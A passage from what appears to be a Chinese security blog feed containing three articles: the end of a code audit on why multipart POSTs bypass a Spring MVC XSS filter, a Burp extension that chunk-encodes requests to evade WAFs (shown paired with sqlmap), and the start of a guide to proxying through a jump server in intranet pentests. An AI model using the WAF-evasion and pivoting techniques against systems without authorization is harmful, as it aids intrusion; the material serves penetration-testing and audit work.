class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tomcat会根据<code>ContentType</code>是否为<code>multipart/form-data</code>判断是否问上传POST型请求，若是则会调用<br><code>parseParts()</code>来解析，我们继续跟进。由于<code>allowCasualMultipartParsing</code>配置项默认为<code>false</code>,<code>parseParts()</code>直接就返回了,也就是说Tomcat默认不会解析上传POST请求。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseParts</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.parts == <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.partsParseException == <span class="keyword">null</span>) &#123;</span><br><span class="line">            MultipartConfigElement mce = <span class="keyword">this</span>.getWrapper().getMultipartConfigElement();</span><br><span class="line">            <span class="keyword">if</span> (mce == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 Tomcat7.0+ 已经内置了multipart支持，但是必须显示激活,默认关闭。在全局tomcat配置文件context.xml,或者为war的本地context.xml添加&lt;Context allowCasualMultipartParsing="true"&gt;开启。</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">this</span>.getContext().getAllowCasualMultipartParsing()) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.parts = Collections.emptyList();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ...</span><br><span class="line">            &#125;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对针对GET行请求和普通POST，Tomcat会调用<code>parameters.processParameters()</code>方法来解析。我们简单看下它的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">processParameters</span><span class="params">(<span class="keyword">byte</span>[] bytes, <span class="keyword">int</span> start, <span class="keyword">int</span> len, Charset charset)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">      <span class="keyword">int</span> decodeFailCount = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">int</span> pos = start;</span><br><span class="line">      <span class="keyword">int</span> end = start + len;</span><br><span class="line"></span><br><span class="line">      label172:</span><br><span class="line">      <span class="keyword">while</span>(pos &lt; end) &#123;</span><br><span class="line">          <span class="keyword">int</span> nameStart = pos;</span><br><span class="line">          <span class="keyword">int</span> nameEnd = -<span class="number">1</span>;</span><br><span class="line">          <span class="keyword">int</span> valueStart = -<span class="number">1</span>;</span><br><span class="line">          <span class="keyword">int</span> valueEnd = -<span class="number">1</span>;</span><br><span class="line">          <span class="keyword">boolean</span> parsingName = <span class="keyword">true</span>;</span><br><span class="line">          <span class="keyword">boolean</span> decodeName = <span class="keyword">false</span>;</span><br><span class="line">          <span class="keyword">boolean</span> decodeValue = <span class="keyword">false</span>;</span><br><span class="line">          <span class="keyword">boolean</span> parameterComplete = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">do</span> &#123;</span><br><span class="line">              <span class="keyword">switch</span>(bytes[pos]) &#123;</span><br><span class="line">              <span class="comment">/*如果遇到%(37)和+(43),会对值进行进行URL解码*/</span></span><br><span class="line">              <span class="keyword">case</span> <span class="number">37</span>:</span><br><span class="line">              <span class="keyword">case</span> <span class="number">43</span>:</span><br><span class="line">                  <span class="keyword">if</span> (parsingName) &#123;</span><br><span class="line">                      decodeName = <span class="keyword">true</span>;</span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                      decodeValue = <span class="keyword">true</span>;</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">                  ++pos;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              <span class="comment">/*如果遇到的&amp;(38)，标记该处为参数名和参数值结尾*/</span></span><br><span class="line">              <span class="keyword">case</span> <span class="number">38</span>:</span><br><span class="line">                  <span class="keyword">if</span> (parsingName) &#123;</span><br><span class="line">                      nameEnd = pos;</span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                      valueEnd = pos;</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">                  parameterComplete = <span class="keyword">true</span>;</span><br><span class="line">                  ++pos;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              <span class="comment">/*如果遇到=(61)，标记该处为参数名的结尾，参数值的开始处*/</span></span><br><span class="line">              <span class="keyword">case</span> <span class="number">61</span>:</span><br><span class="line">                  <span class="keyword">if</span> (parsingName) &#123;</span><br><span class="line">                      nameEnd = pos;</span><br><span class="line">                      parsingName = <span class="keyword">false</span>;</span><br><span class="line">                      ++pos;</span><br><span class="line">                      valueStart = pos;</span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                      ++pos;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              <span class="keyword">default</span>:</span><br><span class="line">                  ++pos;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125; <span class="keyword">while</span>(!parameterComplete &amp;&amp; pos &lt; end);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (pos == end) &#123;</span><br><span class="line">              <span class="keyword">if</span> (nameEnd == -<span class="number">1</span>) &#123;</span><br><span class="line">                  nameEnd = pos;</span><br><span class="line">              &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valueStart &gt; -<span class="number">1</span> &amp;&amp; valueEnd == -<span class="number">1</span>) &#123;</span><br><span class="line">                  valueEnd = pos;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>至此，Tomcat层面对前端请求解析工作结束。接下来Spring MVC会收到Tomcat传来的<code>HttpServletRequest</code>，此时若请求为上传POST型，Spring MVC会继续调用<code>commons-fileuplad.jar</code>对Tomcat传来的原生Servlet请求类<code>HttpServletRequest</code>的实例进行解析处理。</p><p>Spring MVC将原生的<code>HttpServletRequest</code>对象传入<code>CommonsMultipartResolver</code>类的<code>parseRequest()</code>方法进行解析处理。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/CommonsMultipartResolver.parseRequest.png" alt="CommonsMultipartResolver类parseRequest()方法"></p><p><code>CommonsMultipartResolver.parseRequest()</code>方法主要分两步对上传请求进行解析。</p><ul><li>第一步，调用<code>commons-fileupload.jar</code>中的<code>ServletFileUpload</code>类的<code>parseRequest()</code>方法来解析出保存有上传表单各个元素的<code>FileItem</code>列表。</li><li>第二步，调用<code>CommonsFileUploadSupport.parseFileItem()</code>方法解析<code>FileItem</code>列表为保存有表单字段名，字段值等信息<code>MultipartParsingResult</code>类型的<code>Map</code>。</li></ul><p>下面我们来看下这两步的执行细节。首先第一步最终的处理方法为<code>FileUploadBase.parseRequest()</code></p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/FileUploadBase.parseRequest.png" alt="FileUploadBase类parseRequest()方法"></p><p><code>FileUploadBase.parseRequest()</code>解析完会返回一个<code>FileItem</code>实例列表。<code>FileItem</code>就是存储着上传表单的各种元素（字段名，ContentType，是否是简单表单字段，文件名。）本例中我们提交的上传表单的<code>FileItem</code>内容如下：</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/FileItem.png" alt="FileItem实例对象"></p><p>接着来到第二步，调用<code>CommonsFileUploadSupport.parseFileItem()</code>对<code>commons-fileupload.jar</code>处理的结果—FileItem列表，进行处理。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/CommonsFileUploadSupport.parseFileItems.png" alt="CommonsFileUploadSupport类parseFileItems()方法"></p><p>最后将上传表单解析的所有元素（multipartFiles，multipartParameters，multipartParameterContentTypes）封装为一个<code>MultipartParsingResult</code>并返回。至此上传POST型请求的解析工作完成。</p><p>最后Spring MVC，会使用<code>HandlerMethodInvoker.resolveRequestParam()</code>方法，将解析好的请求参数的值，绑定到不同的对象上，方便Controller层获取。具体我们在下面说。</p><h4 id="3-2-上传包无法被过滤的原理"><a href="#3-2-上传包无法被过滤的原理" class="headerlink" title="3.2 上传包无法被过滤的原理"></a>3.2 上传包无法被过滤的原理</h4><p>上面我们用较大边幅说明了Spring MVC是如何获取到前端发来的请求的参数值。下面我们就很好理解，问题的所在了。</p><p>经过跟踪发现，Spring MVC对各类型请求参数的解析并实现自动绑定，主要在<code>HandlerMethodInvoker.resolveRequestParam()</code>方法。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/HandlerMethodInvoker.resolveRequestParam.png" alt="HandlerMethodInvoker类resolveRequestParam()方法"></p><p>继续跟进到获取参数值的那一步。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/ServletWebRequest.getParameterValues.png" alt="ServletWebRequest类getParameterValues()方法"></p><p>通过调式发现，这里如果是GET型和普通POST型请求的话，<code>getRequest()</code>获取到的对象是我们编写的过滤类<code>XssHttpServletRequestWrapper</code>的实例，故调用该对象<code>getParameterValues()</code>来获取值，自然是被过滤了！</p><p>若是上传POST行请求的话，<code>getRequest()</code>获取到的是<code>CommonsMultipartResolver</code>类的对象。但实际上调用该对象的<code>getParamterValues()</code>方法，会执行到<code>DefaultMultipartHttpServletRequest</code>类的<code>getParamterValues()</code>类获取值。这是调式发现的，我暂时也没有搞清楚为何，不过不影响我们解决本次研究的问题。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/DefaultMultipartHttpServletRequest.getParameterValues.png" alt="DefaultMultipartHttpServletRequest类的getParameterValues方法"></p><p>到这里我们基本明白了，上传包中的参数值没有被过滤，是因为Spring MVC在解析上传包获取其参数值时，没有使用我们编写的过滤类<code>XssHttpServletRequestWrapper</code>中的<code>getParamterValues()</code>方法，而是使用了<code>DefaultMultipartHttpServletRequest</code>类<code>getParamterValuses()</code>。</p><p><strong>你可能有疑问，为何SpringMVC获取上传POST请求的参数值时，为啥不调用XssHttpServletRequestWrapper.getParamterValues()来获取呢？</strong></p><p><strong>答：因为这样获取不到。</strong></p><p>借助以下相关类和接口的继承实现关系图，我们继续看看为何获取不到。</p><p><img src="/articles/2019/why-can-multipart-post-bypass-java-filter/DefaultMultipartHttpServletRequest.png" alt="相关类和接口的继承实现关系"></p><p>结合我们上面对Spring MVC和Tomcat如何解析到请求包的参数值的过程，知道GET型和普通POST型请求包是可以通过<code>HttpServletRequest.getParameterValues()</code>直接获取到对应参数的值，而通过图中可知<code>XssHttpServletRequestWrapper</code>实现了<code>HttpServletRequest</code>，自然也是可以通过<code>XssHttpServletRequestWrapper.getParameterValues()</code>获取到的。</p><p>但上传包Tomcat默认没有解析，根据继承关系<code>XssHttpServletRequestWrapper</code>对象中保存的解析结果为Tomcat解析请求的结果，故通过该对象的<code>getParameterValues()</code>方法获取到的参数值为<code>null</code>。也是因此Spring MVC针对Tomcat解析的结果—原生<code>HttpServletRequest</code>，使用<code>common-fileupload.jar</code>来继续解析，得到<code>MultipartHttpServletRequest</code>的实现对象。<code>DefaultMultipartHttpServletRequest</code>类实现了<code>MultipartHttpServletRequest</code>，故通过该类的<code>getParameterValues()</code>方法即可获取到上传POST请求的参数值！</p><p><strong>最后特别说明一点，其实上传POST请求数据是流经过过滤器的。没有被过滤，是由于获取参数值的时候，没有调用过滤器Wrapper对象的方法。所以最终我们看到了上传包可以“绕过”过滤器检查的现象。</strong></p><h2 id="0x05-最后的思考"><a href="#0x05-最后的思考" class="headerlink" title="0x05 最后的思考"></a>0x05 最后的思考</h2><p>在文章发布区，评论区，公告区….等功能点上常常需要上传图片或附件，这时表单往往会以上传包的形式提交数据。而这些功能点也是hack们最关注的XSS漏洞测试点，若不注意上传包可”绕过”过滤器的问题，会造成很严重的后果！</p><p>我从新翻开了之前审计的项目代码，发现很多Spring MVC项目都是使用过滤器对XSS和SQL注入进行全局防御。而过滤器的代码与本文例子的中过滤器代码相似，很明显都是从网上Copy过来的。这样编写代码是存在问题的，针对这种情况，我们该如何正确防御，我们下周文章详述！</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>编写Burp分块传输插件绕WAF</title>
      <link href="/articles/2019/chunked-coding-converter/"/>
      <url>/articles/2019/chunked-coding-converter/</url>
      
        <content type="html"><![CDATA[<p>分块传输绕WAF在年初的<a href="https://www.anquanke.com/post/id/169738" target="_blank" rel="noopener">《利用分块传输吊打所有WAF》</a>中学习到了，不过没有深入研究。最近在T00ls上看到大佬们在编写sqlmap的tamp脚本，过程中遇到了比较难解决的一个问题，对sqlmap数据包加入<code>Transfer-Encoding: chunked</code>HTTP头。本周尝试通过编写Burp插件来解决这个问题，同时也为了方便在Burp上快速测试分块传输是否能绕过waf。我们开始吧！</p><a id="more"></a><h2 id="0x01-功能设计"><a href="#0x01-功能设计" class="headerlink" title="0x01 功能设计"></a>0x01 功能设计</h2><p>我们先来看看插件要实现的功能</p><ol><li>在Burp Repeater套件上可对数据包进行快速chunked解码编码</li><li>自动化对Burp的Proxy，scanner，spider等套件的数据包进行编码</li><li>可设置分块长度，是否开启注释</li></ol><h2 id="0x02-编写代码"><a href="#0x02-编写代码" class="headerlink" title="0x02 编写代码"></a>0x02 编写代码</h2><p>限于边幅，我只说明核心函数，并通过注释的方式解释代码的相关功能。</p><h4 id="2-1-编码函数"><a href="#2-1-编码函数" class="headerlink" title="2.1 编码函数"></a>2.1 编码函数</h4><p>这是我们的核心函数，对各个套件数据HTTP数据进行<code>chunked</code>编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">byte</span>[] encoding(IExtensionHelpers helpers, IHttpRequestResponse requestResponse, <span class="keyword">int</span> split_len, <span class="keyword">boolean</span> isComment) <span class="keyword">throws</span> UnsupportedEncodingException &#123;</span><br><span class="line"><span class="keyword">byte</span>[] request = requestResponse.getRequest();</span><br><span class="line">IRequestInfo requestInfo = helpers.analyzeRequest(request);</span><br><span class="line"><span class="keyword">int</span> bodyOffset = requestInfo.getBodyOffset();</span><br><span class="line"><span class="keyword">int</span> body_length = request.length - bodyOffset;</span><br><span class="line">String body = <span class="keyword">new</span> String(request, bodyOffset, body_length, <span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="comment">// 对长度大于10000的数据包，不处理</span></span><br><span class="line"><span class="keyword">if</span> (request.length - bodyOffset &gt; <span class="number">10000</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> request;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对数据包进行编码处理</span></span><br><span class="line">List&lt;String&gt; str_list = Util.getStrList(body,Config.splite_len);</span><br><span class="line">String encoding_body = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>(String str:str_list)&#123;</span><br><span class="line"><span class="keyword">if</span>(Config.isComment)&#123;</span><br><span class="line">encoding_body += String.format(<span class="string">"%s;%s"</span>,Util.decimalToHex(str.length()),Util.getRandomString(<span class="number">10</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">encoding_body += Util.decimalToHex(str.length());</span><br><span class="line">&#125;</span><br><span class="line">encoding_body += <span class="string">"\r\n"</span>;</span><br><span class="line">encoding_body += str;</span><br><span class="line">encoding_body += <span class="string">"\r\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">encoding_body += <span class="string">"0\r\n\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在数据包中添加Transfer-Encoding: chunked头</span></span><br><span class="line">List&lt;String&gt; headers = helpers.analyzeRequest(request).getHeaders();</span><br><span class="line">Iterator&lt;String&gt; iter = headers.iterator();</span><br><span class="line"><span class="keyword">while</span> (iter.hasNext()) &#123;</span><br><span class="line"><span class="keyword">if</span> (((String)iter.next()).contains(<span class="string">"Transfer-Encoding"</span>)) &#123;</span><br><span class="line">iter.remove();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">headers.add(<span class="string">"Transfer-Encoding: chunked"</span>);</span><br><span class="line"><span class="keyword">return</span> helpers.buildHttpMessage(headers,encoding_body.getBytes());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自动编码其他模块的数据包，我们可以通过实现Burp的<code>IHttpListener</code>，<code>IProxyListener</code>这两个接口，分别实现<code>processHttpMessage()</code>，<code>processProxyMessage()</code>这两个方法。</p><p>这里注意一个问题，Burp的所有模块的HTTP流量都会经过<code>IHttpListener.processHttpMessage()</code>这个方法，但是如果在这里处理数据包的话，Burp Proxy模块的数据包被修改之后,不会在Proxy套件UI界面显示修改后的流量，故Proxy模块流量处理单独使用<code>IProxyListener.processProxyMessage()</code>。</p><h4 id="2-2-自动编码Proxy套件的流量"><a href="#2-2-自动编码Proxy套件的流量" class="headerlink" title="2.2 自动编码Proxy套件的流量"></a>2.2 自动编码Proxy套件的流量</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processProxyMessage</span><span class="params">(<span class="keyword">final</span> <span class="keyword">boolean</span> messageIsRequest, <span class="keyword">final</span> IInterceptedProxyMessage proxyMessage)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(messageIsRequest &amp;&amp; isValidTool(IBurpExtenderCallbacks.TOOL_PROXY))&#123;</span><br><span class="line">IHttpRequestResponse messageInfo = proxyMessage.getMessageInfo();</span><br><span class="line">IRequestInfo reqInfo = helpers.analyzeRequest(messageInfo.getRequest());</span><br><span class="line"><span class="comment">//只对Content-Typt头为application/x-www-form-urlencode的POST包进行编码</span></span><br><span class="line"><span class="keyword">if</span>(reqInfo.getMethod().equals(<span class="string">"POST"</span>) &amp;&amp; reqInfo.getContentType() == IRequestInfo.CONTENT_TYPE_URL_ENCODED)&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//使用encoding方法对原请求包进行chunked编码</span></span><br><span class="line"><span class="keyword">byte</span>[] request = Transfer.encoding(helpers, messageInfo, Config.splite_len,Config.isComment);</span><br><span class="line"><span class="keyword">if</span> (request != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="comment">//将原HTTP请求包替换为chunked编码后的请求包</span></span><br><span class="line">messageInfo.setRequest(request);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">stderr.println(e.getMessage());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-自动编码Proxy之外的套件（Intruder，scanner…）流量"><a href="#2-3-自动编码Proxy之外的套件（Intruder，scanner…）流量" class="headerlink" title="2.3 自动编码Proxy之外的套件（Intruder，scanner…）流量"></a>2.3 自动编码Proxy之外的套件（Intruder，scanner…）流量</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processHttpMessage</span><span class="params">(<span class="keyword">int</span> toolFlag, <span class="keyword">boolean</span> messageIsRequest, IHttpRequestResponse messageInfo)</span> </span>&#123;</span><br><span class="line"><span class="comment">//Proxy套件流量不处理，否则会出现两次编码问题，其余套件均在这里处理。</span></span><br><span class="line"><span class="keyword">if</span>(messageIsRequest &amp;&amp; isValidTool(toolFlag) &amp;&amp; (toolFlag != IBurpExtenderCallbacks.TOOL_PROXY))&#123;</span><br><span class="line">IRequestInfo reqInfo = helpers.analyzeRequest(messageInfo.getRequest());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(reqInfo.getMethod().equals(<span class="string">"POST"</span>) &amp;&amp; reqInfo.getContentType() == IRequestInfo.CONTENT_TYPE_URL_ENCODED)&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">byte</span>[] request = Transfer.encoding(helpers, messageInfo, Config.splite_len,Config.isComment);</span><br><span class="line"><span class="keyword">if</span> (request != <span class="keyword">null</span>) &#123;</span><br><span class="line">messageInfo.setRequest(request);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">stderr.println(e.getMessage());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整的代码，已经上传github，地址如下：</p><p><a href="http://github.com/c0ny1/chunked-coding-converter" target="_blank" rel="noopener">http://github.com/c0ny1/chunked-coding-converter</a></p><h2 id="0x03-效果演示"><a href="#0x03-效果演示" class="headerlink" title="0x03 效果演示"></a>0x03 效果演示</h2><h4 id="3-1-演示一：快速编码解码"><a href="#3-1-演示一：快速编码解码" class="headerlink" title="3.1 演示一：快速编码解码"></a>3.1 演示一：快速编码解码</h4><p>在Burp repeater套件可以快速对请求内容进行chunked编码解码，来对WAF进行测试。</p><p><img src="/articles/2019/chunked-coding-converter/repeater-chunked-coding.gif" alt="快速编码解码对WAF进行测试"></p><h4 id="3-2-演示二：搭配sqlmap进行sql注入"><a href="#3-2-演示二：搭配sqlmap进行sql注入" class="headerlink" title="3.2 演示二：搭配sqlmap进行sql注入"></a>3.2 演示二：搭配sqlmap进行sql注入</h4><p>sqlmap代理到Burp中，插件对Proxy套件的流量进行编码处理，来绕过waf。</p><p><img src="/articles/2019/chunked-coding-converter/sqlmap-bypassWAF.gif" alt="搭配sqlmap绕waf"></p><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><ul><li><a href="https://www.anquanke.com/post/id/169738" target="_blank" rel="noopener">利用分块传输吊打所有WAF</a></li><li><a href="https://www.freebuf.com/news/193659.html" target="_blank" rel="noopener">在HTTP协议层面绕过WAF</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>突破内网渗透中的访问策略限制</title>
      <link href="/articles/2019/break-through-lan-segment-limit/"/>
      <url>/articles/2019/break-through-lan-segment-limit/</url>
      
        <content type="html"><![CDATA[<p>在内网做渗透测试时，常常遇到访问策略限制，无法直接访问渗透目标。本文算是记录下我上一年的几个解决方案。</p><h2 id="0x01-场景说明"><a href="#0x01-场景说明" class="headerlink" title="0x01 场景说明"></a>0x01 场景说明</h2><p>在做安服驻场时，连入客户内网对另一网段的站点进行渗透。有可能会遇到这种情况，虽然连入了客户内网，但无法直接访问目标站点。因为客户内网做了访问策略限制，不同网段无法直接连通。往往需要通过客户提供的跳板服务器去访问，大概的网络示意图如下：</p><p><img src="/articles/2019/break-through-lan-segment-limit/network.png" alt="网络示意图"></p><p>我们当然可以在跳板服务器上装好java环境，方便运行比配的Burp Suite。安装python环境，运行常用的渗透辅助脚本。同时如果你还需要其他工具，得一个一个复制到服务器上……这将非常的繁琐！</p><p><strong>那不能通过某种方法可以使得我们的笔记本直接访问的目标站点呢？</strong>，这样就不用拷贝工具到服务器上了，毕竟还是自己的笔记本渗透舒适。本文就是用于解决这个问题。</p><h2 id="0x02-方案一-HTTP代理"><a href="#0x02-方案一-HTTP代理" class="headerlink" title="0x02 方案一: HTTP代理"></a>0x02 方案一: HTTP代理</h2><h3 id="2-1-跳板服务器配置"><a href="#2-1-跳板服务器配置" class="headerlink" title="2.1 跳板服务器配置"></a>2.1 跳板服务器配置</h3><p>在跳板服务器上搭建Http(s)代理服务器，由于比较简单，就不具体说明如何搭建了。</p><h3 id="2-2-笔记本配置"><a href="#2-2-笔记本配置" class="headerlink" title="2.2 笔记本配置"></a>2.2 笔记本配置</h3><p>在客户端的浏览器上配置好代理，即可访问目标站点了。</p><h3 id="2-3-方案缺点"><a href="#2-3-方案缺点" class="headerlink" title="2.3 方案缺点"></a>2.3 方案缺点</h3><p>只能支持Http协议数据的转发，无法代理其他协议。导致我们无法测试目标站点的其他端口。下个方案我们来解决这个问题。</p><h2 id="0x03-方案二：Shadowsocks"><a href="#0x03-方案二：Shadowsocks" class="headerlink" title="0x03 方案二：Shadowsocks"></a>0x03 方案二：Shadowsocks</h2><p>我们往往都是使用Shadowsocks来FQ，其实这种场景也是可以利用<code>Shadowsocks</code>来解决的。</p><h3 id="3-1-跳板服务器配置"><a href="#3-1-跳板服务器配置" class="headerlink" title="3.1 跳板服务器配置"></a>3.1 跳板服务器配置</h3><p>Shadowsocks有python版，nodejs版，go版和exe版。由于我们得到的跳板机一般为Windows，故这里选择绿色单exe版Shadowsocks,方便携带移动。下载地址如下：</p><p><a href="https://github.com/shadowsocks/libQtShadowsocks" target="_blank" rel="noopener">https://github.com/shadowsocks/libQtShadowsocks</a></p><p>新建以下两个文件，内容分别如下：</p><p><strong>shadowsock.json</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"server"</span>:<span class="string">"0.0.0.0"</span>,</span><br><span class="line"><span class="attr">"server_port"</span>:<span class="number">8388</span>,</span><br><span class="line"><span class="attr">"local_address"</span>:<span class="string">"127.0.0.1"</span>,</span><br><span class="line"><span class="attr">"local_port"</span>:<span class="number">1080</span>,</span><br><span class="line"><span class="attr">"password"</span>:<span class="string">"123456"</span>,</span><br><span class="line"><span class="attr">"timeout"</span>:<span class="number">300</span>,</span><br><span class="line"><span class="attr">"method"</span>:<span class="string">"aes-256-cfb"</span>,</span><br><span class="line"><span class="attr">"fast_open"</span>:<span class="literal">false</span>,</span><br><span class="line"><span class="attr">"workers"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>shadowsock-server.bat</strong></p><figure class="highlight 